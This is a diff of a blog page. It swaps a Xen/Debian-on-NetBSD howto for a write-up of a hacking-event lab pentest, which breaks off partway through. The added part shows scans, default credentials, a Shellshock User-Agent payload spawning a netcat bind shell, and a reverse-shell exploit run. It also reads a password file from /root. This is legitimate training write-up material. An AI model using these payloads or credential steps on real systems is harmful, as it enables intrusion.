@@ -4,7 +4,7 @@
 <!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
 <head>
   <meta charset="utf-8">
-  <title>HowTo: Create new Debian domU using Xen on *BSD</title>
+  <title>usd AG Hacker Day in Hamburg</title>
   <meta name="author" content="Victor Dorneanu">
   <meta name="keywords" content="victor dorneanu, dorneanu, dornea.nu, blog, web, application security, linux, unix, hacking, assembler, python, ipython, javascript, c, c++, freebsd, netbsd, openbsd, debian, arch linux, blacktrack, kali linux" />
 
@@ -1773,291 +1773,575 @@ jQuery(document).ready(function($) {
   <article class="hentry" role="article">
 <header>
     
-    <div id="qr-code-2010/03/22/howto-create-new-debian-domu-using-xen-on-bsd" class="qr-code-image-block"></div>
+    <div id="qr-code-2015/05/24/usd-ag-hacker-day-in-hamburg" class="qr-code-image-block"></div>
     <script src="http://blog.dornea.nu/theme/js/qr.min.js" type="text/javascript"></script>
     <script>
         var img = qr.image({
-            value: 'http://blog.dornea.nu/2010/03/22/howto-create-new-debian-domu-using-xen-on-bsd',
+            value: 'http://blog.dornea.nu/2015/05/24/usd-ag-hacker-day-in-hamburg',
             level: 'L',
             size: 4
         });
-        document.getElementById('qr-code-2010/03/22/howto-create-new-debian-domu-using-xen-on-bsd').appendChild(img);
+        document.getElementById('qr-code-2015/05/24/usd-ag-hacker-day-in-hamburg').appendChild(img);
     </script>
-      <h1 class="entry-title">HowTo: Create new Debian domU using Xen on *BSD</h1>
-      <p class="meta"><time datetime="2010-03-22T00:00:00+01:00" pubdate>Mon 22 March 2010</time></p>
+      <h1 class="entry-title">usd AG Hacker Day in Hamburg</h1>
+      <p class="meta"><time datetime="2015-05-24T00:00:00+02:00" pubdate>Sun 24 May 2015</time></p>
 </header>
 
-  <div class="entry-content"><p><img class="trigger_lightbox mceItem" id="__mce" style="float: left; padding-right: 10px;" title="Xen - Debian + NetBSd" alt="Xen - Debian + NetBSd" src="http://static.dornea.nu/img/2010/4f84fcd0c434884b03a50531499c541c.jpg" width="150" height="113" />In this tutorial you&#8217;ll get detailed information how to setup a fully functionable Debian Lenny system using virtualization software <a href="http://xen.org/">Xen</a>. This entry was written due to high frustration caused by unreliable/outdated articles on the Internet and uncompleted tutorials. This here should be an attempt to describe the installation process completely and provide additional information which might help you solve common problems. The domU system we&#8217;d like to setup (in our case Debian) provides a neat <a href="http://en.wikipedia.org/wiki/NetBoot">netboot</a> installer which supports Xen. I don&#8217;t know &#8211; I don&#8217;t really have the time to look it up &#8211; if any other Linux distributions have such installer (nor if they support Xen at all) , so this howto might also apply &#8211; or not &#8211; to any other distribution. The same applies to the dom0 system: On your system shown shell commands might differ (different syntax)  as well as described methods (e.g. mount pseudo devices etc.). I used NetBSD 5.0_STABLE (amd64) on my system, so there should be no major differences to other BSD systems. If you use Linux as your host system, then you should seek forward since this paper is aimed to focus on *BSD papers. There are enough (good) tutorials out there you can rely on.<!--more--></p>
-<!--break-->
-
-<div id="toc_container" class="toc_wrap_right toc_transparent no_bullets">
-  <p class="toc_title">
-    Contents
-  </p>
-
-  <ul class="toc_list">
-    <li>
-      <a href="#Prerequisites"><span class="toc_number toc_depth_1">1</span> Prerequisites</a>
-    </li>
-    <li>
-      <a href="#i"><span class="toc_number toc_depth_1">2</span>  </a>
-    </li>
-    <li>
-      <a href="#Step_1_Network_configuration"><span class="toc_number toc_depth_1">3</span> Step 1: Network configuration </a>
-    </li>
-    <li>
-      <a href="#Step_2_Create_disk_container"><span class="toc_number toc_depth_1">4</span> Step 2: Create disk container</a>
-    </li>
-    <li>
-      <a href="#i-2"><span class="toc_number toc_depth_1">5</span>  </a>
-    </li>
-    <li>
-      <a href="#Step_3_Get_Debian_kernel_and_ramdisk_file"><span class="toc_number toc_depth_1">6</span> Step 3: Get Debian kernel and ramdisk file</a>
-    </li>
-    <li>
-      <a href="#i-3"><span class="toc_number toc_depth_1">7</span>  </a>
-    </li>
-    <li>
-      <a href="#Step_4_Xen_domU_configuration"><span class="toc_number toc_depth_1">8</span> Step 4: Xen domU configuration</a>
-    </li>
-    <li>
-      <a href="#i-4"><span class="toc_number toc_depth_1">9</span>  </a>
-    </li>
-    <li>
-      <a href="#Step_5_Start_Xen_services"><span class="toc_number toc_depth_1">10</span> Step 5: Start Xen services</a>
-    </li>
-    <li>
-      <a href="#i-5"><span class="toc_number toc_depth_1">11</span>  </a>
-    </li>
-    <li>
-      <a href="#Step_6_Install_Debian"><span class="toc_number toc_depth_1">12</span> Step 6: Install Debian</a>
-    </li>
-    <li>
-      <a href="#i-6"><span class="toc_number toc_depth_1">13</span> </a>
-    </li>
-    <li>
-      <a href="#Step_7_Start_your_fresh_new_Debian_system"><span class="toc_number toc_depth_1">14</span> Step 7: Start your fresh new Debian system</a>
-    </li>
-  </ul>
+  <div class="entry-content"><p>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="prompt input_prompt">
+</div>
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<p>Do you remember this <a href="http://blog.dornea.nu/2015/03/18/usd-ag-hacker-challenge-2015-solutions/">usd AG hacker challenge write-up</a>? This years <a href="https://www.usd.de/akademie_/hackertag/">hacking event</a> organized by the same company took place in <strong>Hamburg</strong>. 9 hackers all over Germany were invited to pwn&amp;0wn all the things. Every team was assigned a certain IP range that had to be pentested. Every host identified within the IP range was <strong>rootable</strong>. And that&#39;s pretty much the information we had before conducting the pentest. My team got the IP range <strong>10.10.10.20-29</strong>. And now let&#39;s have a look at my notes I&#39;ve taken during the hacking session.</p>
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="prompt input_prompt">
+</div>
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Targets">Targets<a class="anchor-link" href="#Targets">&#182;</a></h2>
+</div>
+</div>
 </div>
 
-<h2 id="prerequisites"><span id="Prerequisites"><span style="text-decoration: underline;">Prerequisites</span></span></h2>
-<p>At this point you should have a running Xen instance and have booted your dom0 (NetBSD with kernel XEN3_DOM0). You should have sth like this:</p>
-<pre>$ uname -a
-NetBSD BlackTiny 5.0_STABLE NetBSD 5.0_STABLE (XEN3_DOM0)</pre>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="prompt input_prompt">
+</div>
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<p>First run <code>nmap</code> for assigned IP range (<strong>10.10.10.20-29</strong>):</p>
+<pre><code>$ nmap -A -T4 10.10.10.20-29
+</code></pre>
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="prompt input_prompt">
+</div>
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="10.10.10.20">10.10.10.20<a class="anchor-link" href="#10.10.10.20">&#182;</a></h3>
+</div>
+</div>
+</div>
 
-<p>Some technical details:</p>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="prompt input_prompt">
+</div>
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<p>1) <strong>Nmap</strong> results:</p>
+<pre><code>Nmap scan report for 10.10.10.20
+Host is up (0.0025s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 0b:2e:f0:93:f8:ad:8f:b7:c4:c2:1c:d2:d1:24:98:dc (DSA)
+|   2048 c3:d5:b8:52:a9:3b:a7:79:83:2a:21:4f:81:4f:3f:d9 (RSA)
+|_  256 d0:9e:0d:5c:c8:14:46:e5:10:c4:d9:85:12:33:37:0d (ECDSA)
+80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
+|_http-title: Site doesn&#39;t have a title (text/html).
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          47289/tcp  status
+|_  100024  1          52014/udp  status
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>2) <strong>Nikto</strong> results:</p>
+<pre><code>- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.20
++ Target Hostname:    10.10.10.20
++ Target Port:        80
++ Start Time:         2015-06-03 17:36:01 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.22 (Debian)
++ Server leaks inodes via ETags, header found with file /, inode: 133083, size: 177, mtime: 0x513d254c3afa1
++ The anti-clickjacking X-Frame-Options header is not present.
++ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
++ OSVDB-3268: /private/: Directory indexing found.
++ OSVDB-3092: /private/: This might be interesting...
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 6545 items checked: 0 error(s) and 8 item(s) reported on remote host
++ End Time:           2015-06-03 17:36:26 (GMT2) (25 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</code></pre><p><br/>
+<strong>Observations</strong>:</p>
+<hr/>
+
 <ul>
-<li>System: <em>Lenovo Thinkpad x61 / NetBSD 5.0_STABLE (amd64)</em></li>
-<li>pkgsrc branch: <em>2009Q4</em></li>
-<li>Xen kernel: <em>xenkernel33-3.3.2</em></li>
-<li>Xen tools: <em>xentools33-3.3.2nb1</em></li>
-<li>Xen dom0 kernel: <em>NetBSD 5.0_STABLE</em></li>
+<li>Old version of Apache</li>
+<li>Strange ports open: 47289/tcp, 52014/udp</li>
+<li><p><a href="http://10.10.10.20/private/info.txt">http://10.10.10.20/private/info.txt</a> contained:</p>
+<pre><code>  user@localhost:# 
+  user@localhost:# mail 
+  user@localhost:# hostname
+</code></pre></li>
 </ul>
-<h2 id="_1"><span id="i"> </span></h2>
-<h2 id="step-1-network-configuration"><span id="Step_1_Network_configuration"><strong><span style="text-decoration: underline;">Step 1: Network configuration</span><br /> </strong></span></h2>
-<p>Now you&#8217;ll have to create a network bridge:</p>
-<pre class="brush: plain; toolbar: false">$ ifconfig bridge0 create
-$ ifconfig bridge0
-bridge0: flags=0 mtu 1500</pre>
+<p><br/>
+<strong>Solutions</strong>:</p>
+<hr/>
 
-<p>Make sure you use an Intenet connection based on Ethernet (IEEE 802.3) since the Debian installer provides no WiFi modules (?). There have been several problems when using WiFi due to some data encapsulation issues. So be sure you have an active Internet connection based on Ethernet. Now you should add your Ethernet interface (wm0 on my system) to the network bridge we&#8217;ve created:</p>
-<pre class="brush: plain; toolbar: false">$ brconfig -a
-bridge0: flags=0
-        Configuration:
-                priority 32768 hellotime 2 fwddelay 15 maxage 20
-                ipfilter disabled flags 0x0
-        Interfaces:
-        Address cache (max cache: 100, timeout: 1200):
-
-$ brconfig bridge0 add wm0 stp wm0 up
-$ brconfig bridge0
-bridge0: flags=41 UP,RUNNING
-        Configuration:
-                priority 32768 hellotime 2 fwddelay 15 maxage 20
-                ipfilter disabled flags 0x0
-        Interfaces:
-                wm0 flags=7 LEARNING,DISCOVER,STP
-                        port 1 priority 128 path cost 55 listening
-        Address cache (max cache: 100, timeout: 1200):</pre>
-
-<p>This whole configuration stuff will be gone after reboot in case you don&#8217;t save it to some file. If you want your system to automaticallly create the bridge, then you&#8217;ll have to create &#8220;/etc/ifconfig.bridge0&#8243; and add these lines to it:</p>
-<pre class="lang:default decode:true">create!brconfig $int add [your LAN interface]up</pre>
-
-<p>Be sure to replace &#8220;[your LAN interface]&#8221; with the interface identifier on your system (in my case it would be wm0).</p>
-<p>&nbsp;</p>
-<h2 id="step-2-create-disk-container"><span id="Step_2_Create_disk_container"><span style="text-decoration: underline;"><strong>Step 2: Create disk container</strong></span></span></h2>
-<p>After setting up the network stuff, you should now create a container (about 2GB) where Debian will be later on installed.</p>
-<pre class="brush: plain; toolbar: false">$ dd if=/dev/zero of=Debian-Lenny.img bs=1m count=2048</pre>
-
-<h2 id="_2"><span id="i-2"> </span></h2>
-<h2 id="step-3-get-debian-kernel-and-ramdisk-file"><span id="Step_3_Get_Debian_kernel_and_ramdisk_file"><span style="text-decoration: underline;"><strong>Step 3: Get Debian kernel and ramdisk file</strong></span></span></h2>
-<p>In order to have a fully functionable Debian installation <strong>DON&#8217;T</strong> use <a href="http://people.debian.org/%7Ejoeyh/d-i/images/daily/">these</a> files. You&#8217;ll run into several problems which will keep you busy searching the Internet for the solutions. Instead you should use the i386-current Xen netboot installer from this<a href="ftp://ftp.debian.org/debian/dists/lenny/main/installer-i386/current/images/netboot/xen/"> link</a>. You should at least download:</p>
 <ul>
-<li>the kernel file (<a href="ftp://ftp.debian.org/debian/dists/lenny/main/installer-i386/current/images/netboot/xen/vmlinuz">vmlinuz</a>)</li>
-<li>the ramdisk file (<a href="ftp://ftp.debian.org/debian/dists/lenny/main/installer-i386/current/images/netboot/xen/initrd.gz">initrd.gz</a>)</li>
+<li>Login to machine per SSH using <strong>user:user</strong></li>
+<li>Use a vulnerability in <a href="http://en.wikipedia.org/wiki/Restricted_shell">rbash</a> (restricted bash) in order to run a normal <em>bash</em></li>
+<li>Check out <strong>crontab</strong></li>
+<li>Modify crontab entry to run commands as <em>root</em></li>
 </ul>
-<p>to your local directory.</p>
-<h2 id="_3"><span id="i-3"> </span></h2>
-<h2 id="step-4-xen-domu-configuration"><span id="Step_4_Xen_domU_configuration"><span style="text-decoration: underline;"><strong>Step 4: Xen domU configuration</strong></span></span></h2>
-<p>Now let us configure then Xen domU at least with these options (see xm-debian.cfg):</p>
-<pre class="brush: plain"># Initial memory allocation (in megabytes) for the new domain.
-memory = 128
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="prompt input_prompt">
+</div>
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="10.10.10.21">10.10.10.21<a class="anchor-link" href="#10.10.10.21">&#182;</a></h3>
+</div>
+</div>
+</div>
 
-# A name for your domain. All domains must have different names.
-name = "debianinstall"
+<div class="cell border-box-sizing text_cell rendered">
+<div class="prompt input_prompt">
+</div>
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<p>1) <strong>Nmap</strong> results:</p>
+<pre><code>Nmap scan report for 10.10.10.21
+Host is up (0.0024s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 b8:08:0f:30:c2:68:ad:14:da:f3:aa:4f:ed:81:23:5d (DSA)
+|_  2048 c5:99:11:f8:7a:9e:4c:0a:48:30:8b:9d:51:e6:3f:4f (RSA)
+80/tcp open  http    Apache httpd 2.2.16 ((Debian))
+| http-methods: Potentially risky methods: PUT DELETE
+|_See http://nmap.org/nsedoc/scripts/http-methods.html
+|_http-title: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>2) <strong>Nikto</strong> results:</p>
+<pre><code>- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.21
++ Target Hostname:    10.10.10.21
++ Target Port:        80
++ Start Time:         2015-06-03 14:44:40 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.16 (Debian)
++ Server leaks inodes via ETags, header found with file /, fields: 0xW/319 0x1356645490000 
++ The anti-clickjacking X-Frame-Options header is not present.
++ Apache/2.2.16 appears to be outdated (current is at least Apache/2.2.22). Apache 1.3.42 (final release) and 2.0.64 are also current.
++ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
++ OSVDB-397: HTTP method (&#39;Allow&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.
++ OSVDB-5646: HTTP method (&#39;Allow&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.
++ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
++ Cookie JSESSIONID created without the httponly flag
++ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
++ OSVDB-68662: /axis2/axis2-web/HappyAxis.jsp: SAP BusinessObjects dswsbobje.war deploys Axis2 with a static admin password. See http://www.rapid7.com/security-center/advisories/R7-0037.jsp
++ /axis2/axis2-web/HappyAxis.jsp: Apache Axis2 was found
++ /manager/html: Default Tomcat Manager interface found
++ 6545 items checked: 0 error(s) and 12 item(s) reported on remote host
++ End Time:           2015-06-03 14:45:56 (GMT2) (76 seconds)
+---------------------------------------------------------------------------
+</code></pre><p><br/>
+<strong>Observations</strong>:</p>
+<hr/>
 
-# Define network interfaces
-vif = ['bridge=bridge0']
-...</pre>
+<ul>
+<li>Old version of SSH server</li>
+<li>Old version of Apache server running Apache Tomcat</li>
+<li>HTTP methods PUT and DELETE are available</li>
+<li>The sever is hosting an Axis2 instance</li>
+</ul>
+<p><br/>
+<strong>Solutions</strong>:</p>
+<hr/>
 
-<h2 id="_4"><span id="i-4"> </span></h2>
-<h2 id="step-5-start-xen-services"><span id="Step_5_Start_Xen_services"><span style="text-decoration: underline;"><strong>Step 5: Start Xen services</strong></span></span></h2>
-<p>First be sure you have following entries in your /etc/rc.conf:</p>
-<pre class="lang:default decode:true">xend=YES
-xendomains=YES
-xenbackendd=YES</pre>
+<ul>
+<li>Login to Axis2 admin area using <strong>admin:axis2</strong> (default password)</li>
+<li>Upload a vulnerable service to Axis2 using <strong>metasploit</strong> (exploit/multi/http/axis2_deployer)</li>
+<li>Fire a new <strong>shell</strong> (as user <strong>tomcat</strong>) </li>
+<li>Have a look at <strong>/etc/passwd</strong> and notice that <strong>user</strong> is a &quot;Debian Live User&quot;</li>
+<li>Google for Debians live user default password (=live)</li>
+<li>Login using <strong>user:live</strong></li>
+<li>sudo su --&gt; root</li>
+</ul>
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="prompt input_prompt">
+</div>
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="10.10.10.22">10.10.10.22<a class="anchor-link" href="#10.10.10.22">&#182;</a></h3>
+</div>
+</div>
+</div>
 
-<p>Additionally you can add:</p>
-<pre class="lang:default decode:true">xendomains="domain.foo domain.bar"</pre>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="prompt input_prompt">
+</div>
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<p>1) <strong>Nmap</strong> results:</p>
+<pre><code>Nmap scan report for 10.10.10.22
+Host is up (0.0023s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 4.3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 03:d3:10:1a:5e:9b:f8:32:25:e9:af:e1:3f:5b:61:45 (DSA)
+|_  2048 a2:4d:a5:aa:2a:e4:50:3d:03:cf:f6:5d:d7:e1:75:26 (RSA)
+80/tcp   open  http    Apache httpd 2.2.3 ((CentOS))
+| http-methods: Potentially risky methods: TRACE
+|_See http://nmap.org/nsedoc/scripts/http-methods.html
+|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
+111/tcp  open  rpcbind 2 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1            873/udp  status
+|_  100024  1            876/tcp  status
+3306/tcp open  mysql   MySQL (unauthorized)
+</code></pre><p>2) <strong>Nikto</strong> results:</p>
+<pre><code>- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.22
++ Target Hostname:    10.10.10.22
++ Target Port:        80
++ Start Time:         2015-06-03 14:53:14 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.3 (CentOS)
++ Server leaks inodes via ETags, header found with file /, inode: 1360390, size: 65, mtime: 0x5068ebf68ea80
++ The anti-clickjacking X-Frame-Options header is not present.
++ Apache/2.2.3 appears to be outdated (current is at least Apache/2.2.22). Apache 1.3.42 (final release) and 2.0.64 are also current.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 6545 items checked: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2015-06-03 14:54:40 (GMT2) (86 seconds)
+---------------------------------------------------------------------------
+</code></pre><p><br/>
+<strong>Observations</strong>:</p>
+<hr/>
 
-<p>where  &#8220;domain.foo&#8221; and &#8220;domain.bar&#8221; are your Xen configs for these domains,<br />
-i.e $LOCALBASE/etc/xen/domain.foo.In my case $LOCALBASE is defined as /usr/pkg.This will bring Xen to automatically start your DomUs. (thanks Marcin M. Jessa for this hint)</p>
-<p>Then you should be able to start Xen services:</p>
-<pre class="brush: plain">$ /usr/pkg/share/examples/rc.d/xend start
-$ /usr/pkg/share/examples/rc.d/xenbackendd start
-$ /usr/pkg/share/examples/rc.d/xendomains start</pre>
+<ul>
+<li>Old version of SSH server</li>
+<li>Old version of Apache server running</li>
+<li>MySQL server is exposed to 0.0.0.0</li>
+</ul>
+<p><br/>
+<strong>Solutions</strong>:</p>
+<hr/>
 
-<h2 id="_5"><span id="i-5"> </span></h2>
-<h2 id="step-6-install-debian"><span id="Step_6_Install_Debian"><strong><span style="text-decoration: underline;">Step 6: Install Debian</span></strong></span></h2>
-<p>Now you should be able to start the Debian installation process.</p>
-<pre class="brush: plain">$ ls -l
--rw-r--r--  1 root  wheel  13796958 Mar  3 18:13 initrd.gz
--rw-r--r--  1 root  wheel   1548496 Mar  3 18:13 vmlinuz
--rw-r--r--  1 root  wheel      7733 Mar 21 18:46 xm-debian.cfg
+<ul>
+<li><p>Looking at the web application we&#39;ve found this:</p>
+<pre><code>  $ curl -v &quot;http://10.10.10.22/cgi-bin/hello.sh?hacker&quot;
+  *   Trying 10.10.10.22...
+  * Connected to 10.10.10.22 (10.10.10.22) port 80 (#0)
+  &gt; GET /cgi-bin/hello.sh?hacker HTTP/1.1
+  &gt; Host: 10.10.10.22
+  &gt; User-Agent: curl/7.42.1
+  &gt; Accept: */*
+  &gt; 
+  &lt; HTTP/1.1 200 OK
+  &lt; Date: Wed, 03 Jun 2015 15:56:24 GMT
+  &lt; Server: Apache/2.2.3 (CentOS)
+  &lt; Content-Length: 13
+  &lt; Connection: close
+  &lt; Content-Type: text/plain; charset=UTF-8
+  &lt; 
+  hello hacker
+  * Closing connection 0
+</code></pre></li>
+<li><p>Modifying the parameters lead to:</p>
+<pre><code>  $ curl -v &quot;http://10.10.10.22/cgi-bin/hello.sh?hacker;asdk;ping alkjsd&quot;
+  *   Trying 10.10.10.22...
+  * Connected to 10.10.10.22 (10.10.10.22) port 80 (#0)
+  &gt; GET /cgi-bin/hello.sh?hacker;asdk;ping alkjsd HTTP/1.1
+  &gt; Host: 10.10.10.22
+  &gt; User-Agent: curl/7.42.1
+  &gt; Accept: */*
+  &gt; 
+  &lt; HTTP/1.1 200 OK
+  &lt; Date: Wed, 03 Jun 2015 15:56:33 GMT
+  &lt; Server: Apache/2.2.3 (CentOS)
+  &lt; Content-Length: 25
+  &lt; Connection: close
+  &lt; Content-Type: text/plain; charset=UTF-8
+  &lt; 
+  hello hacker\;asdk\;ping
+  * Closing connection 0
+</code></pre></li>
+<li><p>Apache, cgi-bin, hello.sh ... That looked like a potential <strong>shellshock</strong> attack:</p>
+<pre><code>  $ curl -v -H "$(cat request)&quot; &quot;http://10.10.10.22/cgi-bin/hello.sh?hacker&quot;
+  *   Trying 10.10.10.22...
+  * Connected to 10.10.10.22 (10.10.10.22) port 80 (#0)
+  &gt; GET /cgi-bin/hello.sh?hacker HTTP/1.1
+  &gt; Host: 10.10.10.22
+  &gt; Accept: */*
+  &gt; User-Agent: () { :;}; /bin/bash -c &#39;nc -l -p 4445 -e /bin/bash &amp;&#39;
+  &gt; 
+  &lt; HTTP/1.1 500 Internal Server Error
+  &lt; Date: Wed, 03 Jun 2015 15:57:10 GMT
+  &lt; Server: Apache/2.2.3 (CentOS)
+  &lt; Content-Length: 610
+  &lt; Connection: close
+  &lt; Content-Type: text/html; charset=iso-8859-1
+  &lt; 
+  &lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+  &lt;html&gt;&lt;head&gt;
+  &lt;title&gt;500 Internal Server Error&lt;/title&gt;
+  &lt;/head&gt;&lt;body&gt;
+  &lt;h1&gt;Internal Server Error&lt;/h1&gt;
+  &lt;p&gt;The server encountered an internal error or
+  misconfiguration and was unable to complete
+  your request.&lt;/p&gt;
+  &lt;p&gt;Please contact the server administrator,
+   root@localhost and inform them of the time the error occurred,
+  and anything you might have done that may have
+  caused the error.&lt;/p&gt;
+  &lt;p&gt;More information about this error may be available
+  in the server error log.&lt;/p&gt;
+  &lt;hr&gt;
+  &lt;address&gt;Apache/2.2.3 (CentOS) Server at 10.10.10.22 Port 80&lt;/address&gt;
+  &lt;/body&gt;&lt;/html&gt;
+  * Closing connection 0
+</code></pre><p>  In the above curl output you can see that the <strong>User-Agent</strong> contains the payload:</p>
+<pre><code>  * run **netcat** and listen on port **4445**
+  * when connecting to this port a new **bash** instance should be spawned
+</code></pre></li>
+<li><p>Unfortunately the manual way didn&#39;t work so we&#39;ve found this <a href="https://www.exploit-db.com/exploits/34900/">Apache mod_cgi - ShellshockRemote Exploit</a>:</p>
+<pre><code>  $ wget https://www.exploit-db.com/download/34900 -o shellshock.py
+  $ python2 shellshock.py payload=reverse rhost=10.10.10.22 \
+      lhost=10.10.10.95 lport=4447 pages=http://10.10.10.22/cgi-bin/hello.sh
+  ...
+</code></pre><p>  That will give you a reverse shell on port 4447.</p>
+</li>
+<li><p>Havin the shell access to the machine we&#39;ve stared investigating the permissions on the file system. We&#39;ve found out that current user (www-data I think) was able to read files inside <strong>/root</strong>. </p>
+<pre><code>  10.10.10.22&gt; ls -l
+      total 36
+      -rw-r--r-- 1 root root 20396 May 18  2014 install.log
+      -rw-r--r-- 1 root root  3148 May 18  2014 install.log.syslog
+      -rw-r--r-- 1 root root    13 Feb 25 07:56 password-for-vpn.txt
 
-$ $ sha1 vmlinuz 
-SHA1 (vmlinuz) = becfb0b127c083b1444f896011564b1822423152
-$ sha1 initrd.gz 
-SHA1 (initrd.gz) = 11bc2711f08ed8a0863169c506ab88d69cf9f3cf</pre>
+  10.10.10.22&gt; cat password-for-vpn.txt
+  VeRySeCuRe_7
+</code></pre></li>
+<li>Loging in as <strong>user:VeRySeCuRe_7</strong> per SSH was then successful</li>
+</ul>
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="prompt input_prompt">
+</div>
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="10.10.10.23">10.10.10.23<a class="anchor-link" href="#10.10.10.23">&#182;</a></h3>
+</div>
+</div>
+</div>
 
-<p>You should now launch your Xen domU:</p>
-<pre class="lang:default decode:true">$ xm create xm-debian.cfg install=true install-kernel=./vmlinuz install-ramdisk=./initrd.gz</pre>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="prompt input_prompt">
+</div>
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<p>1) <strong>Nmap</strong> results:</p>
+<pre><code>Nmap scan report for 10.10.10.23
+Host is up (0.0025s latency).
+Not shown: 986 closed ports
+PORT      STATE SERVICE       VERSION
+25/tcp    open  smtp          SLmail smtpd 5.5.0.4433
+| smtp-commands: mailer, SIZE 100000000, SEND, SOML, SAML, HELP, VRFY, EXPN, ETRN, XTRN, 
+|_ This server supports the following commands. HELO MAIL RCPT DATA RSET SEND SOML SAML HELP NOOP QUIT 
+79/tcp    open  finger        SLMail fingerd
+|_finger: Finger online user list request denied.
+106/tcp   open  pop3pw        SLMail pop3pw
+110/tcp   open  pop3          BVRP Software SLMAIL pop3d
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn
+445/tcp   open  netbios-ssn
+3389/tcp  open  ms-wbt-server Microsoft Terminal Service
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49156/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: mailer; OS: Windows; CPE: cpe:/o:microsoft:windows
 
-<p>Since we use no framebuffer you should now switch to your console (by pressing CTRL+ALT + Fx, where X = 1 .. 8), login as root, cd to the previously listed directory and type:</p>
-<pre class="lang:default decode:true">$ xm console debianinstall</pre>
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows 7 Enterprise 7601 Service Pack 1 (Windows 7 Enterprise 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1
+|   Computer name: mailer
+|   NetBIOS computer name: MAILER
+|   Workgroup: WORKGROUP
+|_  System time: 2015-06-03T14:35:31+02:00
+| smb-security-mode: 
+|   Account that was used for smb scripts: &lt;blank&gt;
+|   User-level authentication
+|   SMB Security: Challenge/response passwords supported
+|_  Message signing disabled (dangerous, but default)
+|_smbv2-enabled: Server supports SMBv2 protocol
+</code></pre><p><br/>
+<strong>Observations</strong>:</p>
+<hr/>
 
-<p>You should now have an attached console to Debian&#8217;s installer.</p>
